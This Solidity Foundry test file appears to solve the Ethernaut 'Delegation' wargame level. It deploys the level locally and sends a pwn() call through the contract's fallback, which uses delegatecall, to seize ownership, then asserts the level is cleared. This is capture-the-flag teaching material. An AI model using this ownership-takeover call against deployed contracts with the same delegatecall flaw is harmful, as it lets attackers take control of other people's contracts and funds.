// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Delegation/Delegation.sol";
import "../src/levels/Delegation/DelegationFactory.sol";
import {Vm} from "forge-std/Vm.sol";

contract DelegationTest is DSTest {
    Ethernaut ethernaut;
    DelegationFactory delegationFactory;
    address eoaAddress = address(69);
    Vm private constant vm = Vm(HEVM_ADDRESS);

    function setUp() public {
        ethernaut = new Ethernaut();
        delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.deal(eoaAddress, 1 ether);
    }

    function testIsDelegationCleared() public {
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        levelAddress.call(abi.encodeWithSignature("pwn()"));

        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)));

        vm.stopPrank();
    }
}
